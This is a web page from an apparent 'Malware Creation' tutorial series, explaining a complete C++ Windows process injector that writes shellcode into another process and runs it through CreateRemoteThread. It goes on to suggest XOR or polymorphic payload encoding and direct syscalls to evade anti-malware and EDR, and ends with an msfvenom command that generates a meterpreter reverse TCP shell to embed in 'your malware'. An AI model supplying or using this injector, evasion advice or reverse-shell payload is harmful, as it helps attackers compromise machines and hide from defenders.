<!DOCTYPE html>
<html lang="en-US">

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="style.css" />

    <title>
        Process Injection
    </title>
</head>

<body>
    <header>
        <div class="container">
            <a id="a-title" href="home.html">
                <h1>Malware Creation</h1>
            </a>
            <h2>Process Injection</h2>
        </div>
    </header>

    <div class="container">
        <section id="main_content">
            <h2>Process Injection in C++</h2>
            <p>Let's go through the code step-by-step to understand what's happening:</p>
            <pre>#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

using namespace std;</pre>
            <p>This block of code includes the necessary headers for Windows API functions, as well as the iostream library for console output</p>
            <pre>// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c 
unsigned char shellcode[] = "\xfc\x48\x83\.....";
</pre>
            <p>This is the shellcode that will be injected into the target process. In this case, it's the shellcode for launching the Windows calculator (CMD=calc). This shellcode is generated using the Metasploit Framework's msfvenom tool.</p>
            <pre>int main(int argc, char* argv[]) {
    if (argc != 2) {
        cout << "Usage: injector.exe <pid>" << endl;
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (process == NULL) {
        cout << "Could not open process with PID: " << pid << endl;
        return 1;
    }
</pre>
            <p>The main function begins by checking that the user has provided a process ID as a command-line argument. If not, the program prints a usage message and exits. If a process ID is provided, the code attempts to open the process with PROCESS_ALL_ACCESS
                permissions. If successful, a HANDLE to the process is returned. If unsuccessful, an error message is printed and the program exits.</p>
            <pre>    int size = sizeof(shellcode);

    LPVOID code = VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);//PAGE_EXECUTE_READWRITE);
    if (code == NULL) {
        cout << "Could not allocate memory in target process" << endl;
        return 1;
    }
</pre>
            <p>The code next determines the size of the shellcode, and then allocates memory in the target process using the VirtualAllocEx function. The MEM_COMMIT | MEM_RESERVE flags are used to commit and reserve the memory in the process, respectively.
                PAGE_READWRITE is used to specify the memory protection, allowing the memory to be read and written.</p>
            <p>If the memory allocation fails, an error message is printed and the program exits.</p>
            <pre>    BOOL written = WriteProcessMemory(process, code, shellcode, size, NULL);
    if (!written) {
        cout << "Could not write shellcode to target process" << endl;
        return 1;
    }
</pre>
            <p>The shellcode is then written to the allocated memory in the target process using the WriteProcessMemory function. If the write fails, an error message is printed and the program exits.</p>
            <pre>    DWORD oldProtect;
    BOOL protectChanged = VirtualProtectEx(process, code, size, PAGE_EXECUTE_READ, &oldProtect);
    if (!protectChanged) {
        cout << "Could not change memory protection in target process" << endl;
        return 1;
    }
</pre>
            <p>The memory protection for the allocated memory is then changed to PAGE_EXECUTE_READ using the VirtualProtectEx function. This is done to allow the code to be executed. The old protection value is saved in oldProtect. If the protection change
                fails, an error message is printed and the program exits.</p>





            <pre>    HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)code, NULL, 0, NULL);
if (thread == NULL) {
    cout << "Could not create remote thread in target process" << endl;
    return 1;
}
cout << "Shellcode injected successfully" << endl;

return 0;
}</pre>
            <p>Finally, a remote thread is created in the target process using the CreateRemoteThread function. The thread is started at the location of the allocated memory using the code pointer, and no arguments are passed. If the thread creation fails,
                an error message is printed and the program exits.</p>

            <p>Assuming everything was successful, the program prints a success message and exits with a return value of 0.</p>

            <p>Overall, this code demonstrates the basics of shellcode injection on Windows. It's worth noting, however, that this technique is often used for malicious purposes and should only be used for legitimate purposes, such as penetration testing
                or debugging.</p>

            <h2>Testing</h2>
            <p>Over all this code takes a Process ID as an argument and then attempts to allocate memory inside that process. It then uses this memory space to create a new thread inside that process, this runs the shellcode.</p>
            <p>To Demonstrate and test this we will use a program called <b>Process Hacker 2</b>:</p>

            <p>To test the injection we will use a notepad.exe instance. Just start a notepad instance and then go into Process Hacker 2.</p>
            <p>Using search bar at top search for notepad:</p>
            <img src="img/NotepadSearch.png" alt="searching for notepad inside process hacker 2">
            <p>You will notice that the process has a PID. We will use this as the argument for injection. We will use this as the argument for injection. In this case it is <b>25316</b></p>
            <p>Right click the process and go into properties and then memory</p>
            <p>Then simply run the compiled injector using the PID as the argument</p>
            <p>After the calc.exe pops up close it and look back at the memory inside Process Hacker</p>
            <p>You can easily find the memory as it will be small (around 4kB) and also will have an empty <b>use</b> value.</p>
            <img src="img/memoryallocation.png" alt="memory inside process hacker">
            <p>If you compare the memory values to the shellcode that is in the top of the sourcecode you will notice that they are the same.</p>
            <p>Applying this idea to your own malware you can explore how different functions interact with memory of the app.</p>
            <h1>Possible Improvements:</h1>
            <h2>PayLoad Encoding</h2>
            <p>
                One way to improve the stealthiness of the payload is by implementing an encoder. This can help to obfuscate the payload and make it more difficult for anti-malware software to detect. An encoder works by taking the original payload and transforming it
                in some way. The transformed payload can be thought of as a cyphertext, and the original payload as the plaintext.
            </p>
            <p>
                One common approach to encoding is to use an XOR-based algorithm. In this approach, the payload is XORed with a key to create the encoded payload. To decode the payload, the same key is used to XOR the encoded payload, which will result in the original
                payload. Another approach is to use a more complex algorithm, such as a custom encryption algorithm or a polymorphic encryption algorithm. These algorithms are more difficult to reverse-engineer and can provide even more protection against
                detection.
            </p>
            <p>
                To implement an encoder, the payload can be modified to include an additional function that performs the encoding and decoding. The encoded payload can then be passed to the process injection code to be injected into the target process. Once in the target
                process, the payload can be decoded and executed. While encoding can improve the stealthiness of the payload, it can also introduce complexity and potential errors. Additionally, some anti-malware software may already be capable of detecting
                and analyzing encoded payloads. It is important to carefully consider the trade-offs and potential consequences before implementing an encoder to the payload.
            </p>
            <h2>Sys-Calls</h2>
            <p>

                One possible improvement to this code could be to use indirect or direct system calls (syscalls) instead of WinAPI functions. This can help avoid detection by anti-malware software that looks for specific function calls. The WinAPI functions are a set
                of functions provided by Windows that allow user-mode programs to interact with the operating system.
            </p>
            <p>
                Using indirect syscalls involves using inline assembly code to call the Windows system call interface directly instead of using the WinAPI functions. Using direct syscalls involves using a technique known as "syscalls hooking" to replace the IAT entries
                for WinAPI functions with the actual system call numbers.

            </p>
            <h1>Creating Custom Shell Code using MetaSploit:</h1>
            <p>Most Payloads in the MetaSploit database can be outputted as shell code. This means that you can easily create shellcode to tailor your malware to do what is needed. The command to do this is using the msfvenom program in MetaSploit:</p>
            <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f c -a x86 --platform windows
</pre>
            <p>This will generate a reverse TCP shell that is outputted in raw bytes. This is then added to the payload of the malware. As discussed you can also encode the malware before putting in program to stop static analysis of EDR from picking up
                the malicious payload.</p>
        </section>
    </div>
    <hr>
    <footer>
        <nav>
            <a href="index.html" class="footer-link" id="bottom-link-alt">Home</a>
            <a href="developmentsetup.html" class="footer-link" id="bottom-link">Development and Testing Setup</a>
            <a href="antivirusfactfile.html" class="footer-link" id="bottom-link">Antivirus Fact File</a>
            <a href="WindowsAPl.html" class="footer-link" id="bottom-link-alt">Windows API</a>
            <a href="processesthreadshandles.html" class="footer-link" id="bottom-link-alt">Processes, Threads, and Handles</a>
            <a href="processinjection.html" class="footer-link" id="bottom-link">Process Injection</a>
            <a href="DynamicImports.html" class="footer-link" id="bottom-link">Dynamic Imports</a>
            <a href="installingnim.html" class="footer-link" id="bottom-link-alt">Installing Nim</a>
            <a href="basicnimshell.html" class="footer-link" id="bottom-link-alt">Basic Nim Shell</a>
            <a href="obfuscatingnimshell.html" class="footer-link" id="bottom-link">Obfuscating Nim Shell</a>
            <a href="customencoder.html" class="footer-link" id="bottom-link">Custom Encoder</a>
            <a href="Nimjector.html" class="footer-link" id="bottom-link-alt">Custom Modular Malware</a>
        </nav>
    </footer>
</body>

</html>